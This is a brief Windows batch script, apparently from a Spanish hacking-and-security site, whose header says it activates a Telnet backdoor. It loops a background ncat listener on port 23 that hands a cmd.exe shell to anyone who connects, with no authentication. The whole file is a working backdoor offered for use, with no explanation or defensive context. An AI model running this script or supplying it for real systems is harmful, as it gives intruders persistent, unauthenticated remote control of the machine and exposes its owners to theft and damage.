@echo off
echo "2020 (c) hackingyseguridad.com" 
echo "Activa puerta trasera TelnetD para Windows"
:inicio
start /B ncat -l -t -p 23 -e cmd.exe 
goto inicio
